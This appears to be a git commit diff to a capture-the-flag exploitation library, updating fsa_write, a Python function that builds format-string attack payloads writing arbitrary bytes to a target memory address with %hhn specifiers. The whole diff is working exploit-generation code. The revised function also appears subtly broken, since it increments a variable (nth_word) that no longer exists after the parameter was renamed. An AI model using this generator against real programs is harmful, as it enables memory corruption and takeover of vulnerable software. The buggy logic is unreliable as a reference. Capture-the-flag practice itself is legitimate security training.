92ff5816a36a9997e73f3860c2f986bd83346b6f
Laik4 <me@m.albina.cc>
2020-09-21 13:55:19 +0900

    Update fsa_write

--- toyotama/pwn/fsa.py
+++ toyotama/pwn/fsa.py
@@ -1,35 +1,40 @@
 from toyotama.pwn.util import *
 
-def fsa_write(target_addr: list, contents: list, nth_word: int, sofar=0, offset=0):
+
+
+def fsa_write(target_addr: int, contents: int, nth_stack: int, output=0, sofar=0, offset=0, bits=64):
     """
     target_addr: The address where the content will be written
     contents: What you want to write
-    sofar: The number of characters written so far 
-    nth_word: example 1-indexed
+    output: The number of characters which executable output
+    sofar: The length of payload so far 
+    nth_stack: example 
                 "AAAA%p %p %p..."
                 -> AAAA0x1e 0xf7f6f580 0x804860b 0xf7f6f000 0xf7fbb2f0 (nil) 0x4141d402
                 -> 7th (0x4141d402)
-    offset: from the above, offset is 2 (0x4141d402)
-
-    verified : pwnb0d, Villager A
+    offset: from this example, offset is 2 (0x4141d402)
     """
 
+    pack = p64 if bits == 64 else p32
+
     # adjust stack alignment
-    payload = fill(-offset%4)
+    payload = fill(-offset%(bits//8))
     if offset != 0:
         nth_word += 1
 
-    for t_addr in target_addr:
-        for i in range(4):
-            payload += p32(t_addr+i)
-            sofar += 4
+    for byte in pack(contents):
+        offset = byte - output%0x100 
+        if offset <= 1:
+            offset += 0x100
+        payload += f'%{offset}c%{nth_stack}$hhn'.encode()
+        nth_stack += 1
+        output += offset
+    
+    payload += b'\x00'*(128-len(payload)-sofar)
 
-    for content in contents:
-        for byte in bytes.fromhex(f'{content:08x}')[::-1]:
-            offset = (byte-sofar) % 0x100
-            sofar = byte
-            payload += f'%{offset}x%{nth_word}$hhn'.encode()
-            nth_word += 1
+    for i in range(bits//8):
+        payload += pack(target_addr+i)
 
     return payload
+
 
